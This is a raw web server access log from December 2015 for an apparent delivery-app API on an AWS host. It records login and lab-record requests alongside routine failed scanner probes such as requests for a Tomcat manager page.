223.223.131.253 - - [21/Dec/2015:18:09:15 +0000] "POST /api/user/login HTTP/1.1" 200 122 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:29:05 +0000] "POST /api/user/login HTTP/1.1" 200 122 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:29:25 +0000] "POST /api/user/login HTTP/1.1" 200 122 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:29:53 +0000] "POST /api/user/login HTTP/1.1" 200 122 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:30:23 +0000] "POST /api/user/login HTTP/1.1" 200 122 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:31:08 +0000] "POST /api/user/login HTTP/1.1" 200 122 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:31:57 +0000] "POST /api/user/login HTTP/1.1" 200 445 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:33:25 +0000] "POST /api/user/login HTTP/1.1" 200 519 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:18:38:10 +0000] "POST /api/user/login HTTP/1.1" 200 519 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [21/Dec/2015:19:18:40 +0000] "POST /api/user/login HTTP/1.1" 200 519 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
185.25.151.159 - - [22/Dec/2015:01:20:09 +0000] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
91.236.75.4 - - [22/Dec/2015:03:45:59 +0000] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 92 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
61.216.2.15 - - [22/Dec/2015:04:29:58 +0000] "GET / HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
169.54.244.75 - - [22/Dec/2015:11:22:20 +0000] "GET / HTTP/1.0" 404 92 "-" "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
74.101.233.155 - - [22/Dec/2015:11:36:05 +0000] "POST /api/user/login HTTP/1.1" 200 519 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
202.109.143.18 - - [22/Dec/2015:11:50:46 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
116.193.138.137 - - [22/Dec/2015:15:37:27 +0000] "GET / HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:37:28 +0000] "GET /favicon.ico HTTP/1.1" 404 92 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com:8080/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:37:28 +0000] "GET /favicon.ico HTTP/1.1" 404 92 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com:8080/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:37:28 +0000] "GET /favicon.ico HTTP/1.1" 404 92 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com:8080/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:37:28 +0000] "GET /favicon.ico HTTP/1.1" 404 92 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com:8080/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:37:38 +0000] "GET /api/users/login HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:38:32 +0000] "GET /api/user/login HTTP/1.1" 401 110 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:40:09 +0000] "GET /api/user/test HTTP/1.1" 401 110 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:40:12 +0000] "GET /api/users/test HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:40:25 +0000] "GET /api/users/test HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:40:26 +0000] "GET /api/users/test HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:40:27 +0000] "GET /api/users/test HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:40:27 +0000] "GET /api/users/test HTTP/1.1" 404 92 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:41:04 +0000] "POST /api/user/login HTTP/1.1" 200 147 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:41:20 +0000] "POST /api/user/login HTTP/1.1" 200 147 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:44:07 +0000] "POST /api/user/login HTTP/1.1" 200 455 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:46:55 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:47:31 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:15:50:16 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:15:52:28 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:15:53:46 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:15:55:57 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:15:57:27 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:15:58:41 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:16:07:53 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:16:08:48 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:16:11:05 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
125.57.105.5 - - [22/Dec/2015:17:02:27 +0000] "GET / HTTP/1.0" 404 92 "-" "-"
116.193.138.137 - - [22/Dec/2015:17:21:24 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
223.223.131.253 - - [22/Dec/2015:17:22:37 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:17:23:32 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:17:29:16 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:17:29:21 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
223.223.131.253 - - [22/Dec/2015:17:55:47 +0000] "POST /api/user/login HTTP/1.1" 200 519 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:17:55:58 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:17:56:26 +0000] "POST /api/user/login HTTP/1.1" 200 519 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
116.193.138.137 - - [22/Dec/2015:17:57:03 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:17:59:59 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:18:04:20 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:18:05:21 +0000] "POST /api/user/login HTTP/1.1" 200 147 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
116.193.138.137 - - [22/Dec/2015:18:05:31 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
223.223.131.253 - - [22/Dec/2015:18:06:10 +0000] "POST /api/user/login HTTP/1.1" 200 519 "http://52.77.210.85/precisedelivery/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
223.223.131.253 - - [22/Dec/2015:18:08:42 +0000] "POST /api/user/login HTTP/1.1" 200 519 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
223.223.131.253 - - [22/Dec/2015:20:02:15 +0000] "POST /api/user/login HTTP/1.1" 200 519 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:03:28 +0000] "GET /api/lab HTTP/1.1" 200 87 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:04:22 +0000] "GET /api/lab HTTP/1.1" 200 116 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:04:34 +0000] "GET /api/lab HTTP/1.1" 200 87 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:10:13 +0000] "POST /api/lab HTTP/1.1" 200 108 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:10:17 +0000] "GET /api/lab HTTP/1.1" 200 394 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:14:36 +0000] "GET /api/lab HTTP/1.1" 200 394 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:14:42 +0000] "POST /api/lab HTTP/1.1" 200 175 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:16:19 +0000] "POST /api/lab HTTP/1.1" 200 122 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:17:15 +0000] "GET /api/lab HTTP/1.1" 200 394 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:17:25 +0000] "GET /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 392 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:21:33 +0000] "PUT /api/lab HTTP/1.1" 200 107 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:21:40 +0000] "GET /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 393 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:26:11 +0000] "DELETE /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 108 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:26:18 +0000] "GET /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 392 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:26:28 +0000] "GET /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 392 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:26:35 +0000] "DELETE /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 108 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:26:39 +0000] "GET /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 392 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
223.223.131.253 - - [22/Dec/2015:20:27:19 +0000] "GET /api/lab/5679ae25d78142a758787c93 HTTP/1.1" 200 89 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
198.20.69.74 - - [23/Dec/2015:02:02:53 +0000] "GET / HTTP/1.1" 404 92 "-" "-"
198.20.69.74 - - [23/Dec/2015:02:02:53 +0000] "GET /robots.txt HTTP/1.1" 404 92 "-" "-"
198.20.69.74 - - [23/Dec/2015:02:02:54 +0000] "GET /sitemap.xml HTTP/1.1" 404 92 "-" "-"
104.192.0.226 - - [23/Dec/2015:02:23:13 +0000] "GET /lang/en/js/feature.js HTTP/1.0" 404 92 "-" "-"
155.94.224.207 - - [23/Dec/2015:03:34:47 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
104.219.238.10 - - [23/Dec/2015:06:43:55 +0000] "GET / HTTP/1.0" 404 92 "-" "-"
142.4.40.41 - - [23/Dec/2015:09:27:42 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
202.109.143.18 - - [23/Dec/2015:12:03:39 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
222.186.134.117 - - [23/Dec/2015:14:29:10 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
203.171.246.1 - - [23/Dec/2015:15:24:02 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
222.186.134.117 - - [23/Dec/2015:15:31:07 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
203.171.246.1 - - [23/Dec/2015:17:20:01 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.1 - - [23/Dec/2015:17:33:43 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
45.123.109.155 - - [23/Dec/2015:17:33:50 +0000] "POST /api/user/login HTTP/1.1" 200 519 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
203.171.246.1 - - [23/Dec/2015:17:34:26 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.1 - - [23/Dec/2015:17:42:53 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.1 - - [23/Dec/2015:17:50:55 +0000] "POST /api/user/login HTTP/1.1" 200 519 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
203.171.246.1 - - [23/Dec/2015:17:52:29 +0000] "POST /api/lab HTTP/1.1" 200 108 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
203.171.246.1 - - [23/Dec/2015:17:52:41 +0000] "GET /api/lab HTTP/1.1" 200 394 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
203.171.246.1 - - [23/Dec/2015:18:10:22 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://localhost/AngularAdmin/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
202.109.143.18 - - [24/Dec/2015:02:01:05 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
91.236.75.4 - - [24/Dec/2015:02:31:12 +0000] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 92 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
202.109.143.18 - - [24/Dec/2015:04:50:28 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
202.109.143.18 - - [24/Dec/2015:05:22:28 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
91.236.75.4 - - [24/Dec/2015:06:38:43 +0000] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 92 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
104.219.238.10 - - [24/Dec/2015:08:13:30 +0000] "GET / HTTP/1.0" 404 92 "-" "-"
202.109.143.18 - - [24/Dec/2015:11:48:11 +0000] "GET /manager/html HTTP/1.1" 404 92 "-" "Mozilla/3.0 (compatible; Indy Library)"
203.171.246.254 - - [24/Dec/2015:15:03:54 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:16:54:11 +0000] "POST /api/lab HTTP/1.1" 200 180 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:16:55:44 +0000] "POST /api/lab HTTP/1.1" 200 108 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:16:59:01 +0000] "GET /api/lab HTTP/1.1" 200 690 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:04:34 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:05:11 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:10:01 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:12:08 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:12:32 +0000] "POST /api/lab HTTP/1.1" 200 108 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:12:34 +0000] "GET /api/lab HTTP/1.1" 200 1002 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:16:07 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:17:41 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:20:25 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:17:21:24 +0000] "GET /api/lab HTTP/1.1" 304 - "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
203.171.246.254 - - [24/Dec/2015:18:05:49 +0000] "POST /api/user/login HTTP/1.1" 200 529 "http://ec2-52-77-210-85.ap-southeast-1.compute.amazonaws.com/precisedelivery/" "Mozilla/5.0 (Windows NT 5.1; rv:43.0) Gecko/20100101 Firefox/43.0"
